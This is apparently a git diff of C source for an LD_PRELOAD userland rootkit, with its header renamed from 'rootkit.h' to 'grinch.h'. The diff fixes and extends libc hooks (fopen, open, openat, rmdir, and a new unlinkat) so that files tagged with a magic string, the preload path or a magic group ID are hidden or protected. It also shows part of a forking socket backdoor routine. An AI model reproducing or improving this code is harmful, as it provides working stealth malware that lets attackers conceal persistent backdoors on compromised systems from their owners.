@@ -11,7 +11,7 @@
 #include <string.h>
 #include <netinet/in.h>
 #include <errno.h>
-#include "rootkit.h"
+#include "grinch.h"
 
 
 static struct dirent* (*old_readdir)(DIR *dir) = NULL;
@@ -19,8 +19,9 @@ static struct dirent64* (*old_readdir64)(DIR *dir) = NULL;
 static FILE* (*old_fopen)(const char *path, const char *mode) = NULL;
 static FILE* (*old_fopen64)(const char *path, const char *mode) = NULL;
 static int (*old_open)(const char *path, int flags, mode_t mode) = NULL;
-static int (*old_openat)(int fd, const char *pathname, int flags) = NULL;
+static int (*old_openat)(int fd, const char *pathname, int flags, mode_t mode) = NULL;
 static int (*old_rmdir)(const char *path) = NULL;
+static int (*old_unlinkat)(int fd, const char *path, int flags) = NULL;
 static int (*old_fxstat)(int ver, int fd, struct stat *buf) = NULL;
 static int (*old_fxstat64)(int ver, int fd, struct stat64 *buf) = NULL;
 static int (*old_lxstat)(int ver, const char *path, struct stat *buf) = NULL;
@@ -34,7 +35,7 @@ void IPv4() {
     int sockfd;
     pid_t pid;
     
-    setgid((gid_t)MAGIC_GID);
+    setgid(MAGIC_GID);
     if((pid = fork()) == 0) {
         if((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1) exit(0x0);
         struct sockaddr_in server, client;
@@ -106,8 +107,9 @@ FILE* fopen(const char *path, const char *mode) {
     if(old_xstat == NULL) old_xstat = dlsym(RTLD_NEXT, "__xstat");
     memset(&tmp_stat, 0, sizeof(stat));
     old_xstat(3, path, &tmp_stat);
-    if(strstr(path, MAGIC_STRING) == NULL
-    || strstr(path, PRELOAD_PATH) == NULL
+
+    if(strstr(path, MAGIC_STRING) != NULL
+    || strcmp(path, PRELOAD_PATH) == 0
     || tmp_stat.st_gid == MAGIC_GID) {
         errno = ENOENT;
         return NULL;
@@ -143,8 +145,9 @@ FILE* fopen64(const char *path, const char *mode) {
     if(old_xstat64 == NULL) old_xstat64 = dlsym(RTLD_NEXT, "__xstat64");
     memset(&tmp_stat, 0, sizeof(stat64));
     old_xstat64(3, path, &tmp_stat);
-    if(strstr(path, MAGIC_STRING) == NULL
-    || strstr(path, PRELOAD_PATH) == NULL
+
+    if(strstr(path, MAGIC_STRING) != NULL
+    || strcmp(path, PRELOAD_PATH) == 0
     || tmp_stat.st_gid == MAGIC_GID) {
         errno = ENOENT;
         return NULL;
@@ -155,23 +158,23 @@ FILE* fopen64(const char *path, const char *mode) {
 
 int open(const char *path, int flags, mode_t mode) {
     if(old_open == NULL) old_open = dlsym(RTLD_NEXT, "open");
-    
+ 
     #if __x86_64__
-        struct stat64 tmp_stat;
+    struct stat64 tmp_stat;
 
-        if(old_xstat64 == NULL) old_xstat64 = dlsym(RTLD_NEXT, "__xstat64");
-        memset(&tmp_stat, 0, sizeof(stat64));
-        old_xstat64(3, path, &tmp_stat);
+    if(old_xstat64 == NULL) old_xstat64 = dlsym(RTLD_NEXT, "__xstat64");
+    memset(&tmp_stat, 0, sizeof(stat64));
+    old_xstat64(3, path, &tmp_stat);
     #else
-        struct stat tmp_stat;
+    struct stat tmp_stat;
 
-        if(old_xstat == NULL) old_xstat = dlsym(RTLD_NEXT, "__xstat");
-        memset(&tmp_stat, 0, sizeof(stat));
-        old_xstat(3, path, &tmp_stat);
+    if(old_xstat == NULL) old_xstat = dlsym(RTLD_NEXT, "__xstat");
+    memset(&tmp_stat, 0, sizeof(stat));
+    old_xstat(3, path, &tmp_stat);
     #endif
 
-    if(strstr(path, MAGIC_STRING) == NULL
-    || strstr(path, PRELOAD_PATH) == NULL
+    if(strstr(path, MAGIC_STRING) != NULL
+    || strcmp(path, PRELOAD_PATH) == 0
     || tmp_stat.st_gid == MAGIC_GID) {
         errno = ENOENT;
         return -1;
@@ -180,30 +183,30 @@ int open(const char *path, int flags, mode_t mode) {
 }
 
 
-int openat(int fd, const char *path, int flags) {
+int openat(int fd, const char *path, int flags, mode_t mode) {
     if(old_openat == NULL) old_openat = dlsym(RTLD_NEXT, "openat");
 
     #if __x86_64__
-        struct stat64 tmp_stat;
+    struct stat64 tmp_stat;
 
-        if(old_xstat64 == NULL) old_xstat64 = dlsym(RTLD_NEXT, "__xstat64");
-        memset(&tmp_stat, 0, sizeof(stat64));
-        old_xstat64(3, path, &tmp_stat);
+    if(old_xstat64 == NULL) old_xstat64 = dlsym(RTLD_NEXT, "__xstat64");
+    memset(&tmp_stat, 0, sizeof(stat64));
+    old_xstat64(3, path, &tmp_stat);
     #else
-        struct stat tmp_stat;
+    struct stat tmp_stat;
 
-        if(old_xstat == NULL) old_xstat = dlsym(RTLD_NEXT, "__xstat");
-        memset(&tmp_stat, 0, sizeof(stat));
-        old_xstat(3, path, &tmp_stat);
+    if(old_xstat == NULL) old_xstat = dlsym(RTLD_NEXT, "__xstat");
+    memset(&tmp_stat, 0, sizeof(stat));
+    old_xstat(3, path, &tmp_stat);
     #endif
 
-    if(strstr(path, MAGIC_STRING) == NULL
-    || strstr(path, PRELOAD_PATH) == NULL
+    if(strstr(path, MAGIC_STRING) != NULL
+    || strcmp(path, PRELOAD_PATH) == 0
     || tmp_stat.st_gid == MAGIC_GID) {
         errno = ENOENT;
         return -1;
     }
-    return old_openat(fd, path, flags);
+    return old_openat(fd, path, flags, mode);
 }
 
 
@@ -211,26 +214,53 @@ int rmdir(const char *path) {
     if(old_rmdir == NULL) old_rmdir = dlsym(RTLD_NEXT, "rmdir");
 
     #if __x86_64__
-        struct stat64 tmp_stat;
+    struct stat64 tmp_stat;
 
-        if(old_xstat64 == NULL) old_xstat64 = dlsym(RTLD_NEXT, "__xstat64");
-        memset(&tmp_stat, 0, sizeof(stat64));
-        old_xstat64(3, path, &tmp_stat);
+    if(old_xstat64 == NULL) old_xstat64 = dlsym(RTLD_NEXT, "__xstat64");
+    memset(&tmp_stat, 0, sizeof(stat64));
+    old_xstat64(3, path, &tmp_stat);
     #else
-        struct stat tmp_stat;
+    struct stat tmp_stat;
 
-        if(old_xstat == NULL) old_xstat = dlsym(RTLD_NEXT, "__xstat");
-        memset(&tmp_stat, 0, sizeof(stat));
-        old_xstat(3, path, &tmp_stat);
+    if(old_xstat == NULL) old_xstat = dlsym(RTLD_NEXT, "__xstat");
+    memset(&tmp_stat, 0, sizeof(stat));
+    old_xstat(3, path, &tmp_stat);
     #endif
 
-    if(strstr(path, MAGIC_STRING) == NULL
-    || strstr(path, PRELOAD_PATH) == NULL
+    if(strstr(path, MAGIC_STRING) != NULL
+    || strcmp(path, PRELOAD_PATH) == 0
     || tmp_stat.st_gid == MAGIC_GID) {
         errno = ENOENT;
         return -1;
     }
     return old_rmdir(path);
+}
+
+
+int unlinkat(int fd, const char *path, int flags) {
+    if(old_unlinkat == NULL) old_unlinkat = dlsym(RTLD_NEXT, "unlinkat");
+
+    #if __x86_64__
+    struct stat64 tmp_stat;
+
+    if(old_xstat64 == NULL) old_xstat64 = dlsym(RTLD_NEXT, "__xstat64");
+    memset(&tmp_stat, 0, sizeof(stat64));
+    old_xstat64(3, path, &tmp_stat);
+    #else
+    struct stat tmp_stat;
+
+    if(old_xstat == NULL) old_xstat = dlsym(RTLD_NEXT, "__xstat");
+    memset(&tmp_stat, 0, sizeof(stat));
+    old_xstat(3, path, &tmp_stat);
+    #endif
+
+    if(strstr(path, MAGIC_STRING) != NULL
+    || strcmp(path, PRELOAD_PATH) == 0
+    || tmp_stat.st_gid == MAGIC_GID) {
+        errno = ENOENT;
+        return -1;
+    }
+    return old_unlinkat(fd, path, flags);
 }
 
 
